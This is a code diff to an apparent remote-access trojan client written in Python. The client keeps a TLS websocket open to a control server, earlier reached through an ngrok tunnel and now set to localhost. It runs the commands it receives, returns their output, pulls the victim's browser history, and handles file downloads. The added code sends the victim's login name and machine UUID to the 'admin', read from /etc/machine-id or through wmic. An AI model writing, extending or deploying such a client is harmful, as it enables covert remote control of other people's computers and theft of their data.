@@ -1,5 +1,6 @@
 import asyncio
 import json
+import platform
 import ssl
 
 # import ssl
@@ -12,16 +13,27 @@ import time
 from browser.monitor_website import fetch_hist
 from utils import handle_cd, download_file, maintain_client_status, modify_result, handle_ls
 
+operating_system = platform.system().lower()
+
 
 async def start_client():
     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ssl_context.load_verify_locations(cafile='./server.crt')
-    uri = "wss://0.tcp.au.ngrok.io:10635/ws/client"
+    uri = "wss://127.0.0.1:8000/ws/client"
 
     while True:
         try:
             async with websockets.connect(uri, ssl=ssl_context) as websocket:
                 active = 0
+
+                # get client details for admin.
+                await websocket.send(".%.")
+                time.sleep(0.001)
+                username = os.getlogin()
+                system_uuid = get_system_uuid()
+                response = {"username": username, "system_uuid": system_uuid}
+                await websocket.send(json.dumps(response))
+
                 while True:
                     print("Active status: ", active)
                     try:
@@ -30,7 +42,12 @@ async def start_client():
                             command = await websocket.recv()
                             active = command
                             time.sleep(0.001)
+                            username = os.getlogin()
+                            system_uuid = get_system_uuid()
                             await websocket.send(f"cwd%`{os.getcwd()}")
+                            time.sleep(0.001)
+                            response = {"username": username, "system_uuid": system_uuid}
+                            await websocket.send(json.dumps(response))
                             continue
 
                         time.sleep(0.001)
@@ -55,9 +72,6 @@ async def start_client():
                             await websocket.send(hist)
                             continue
 
-                        elif command.lower().startswith('cd'):
-                            cd = True
-
                         cd_result = handle_cd(command)
                         if cd_result:
                             # response = modify_result(result.stdout)
@@ -75,7 +89,9 @@ async def start_client():
 
                         # Send the result back to the server
                         if command.lower().startswith('ls'):
+                            cwd = os.getcwd()
                             response = handle_ls(result)
+                            response['cwd'] = cwd
                             # response = modify_result(result.stdout)
                             await websocket.send("ls")
                             time.sleep(0.001)
@@ -98,6 +114,30 @@ async def start_client():
             time.sleep(3)
         finally:
             print("Closing connection")
+
+
+def get_system_uuid():
+    if operating_system == 'linux':
+        try:
+            with open('/etc/machine-id', 'r') as file:
+                return file.read().strip()
+        except FileNotFoundError:
+            return None
+
+    elif operating_system == 'windows':
+        # result = subprocess.run(
+        #     ['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'],
+        #     capture_output=True, text=True)
+        # return result.stdout.strip().split()[-1].strip()
+        try:
+            result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
+            output = result.stdout.strip().split("\n")[-1].strip()
+            return output
+        except subprocess.CalledProcessError as e:
+            print(e)
+            return None
+
+    return None
 
 
 if __name__ == "__main__":
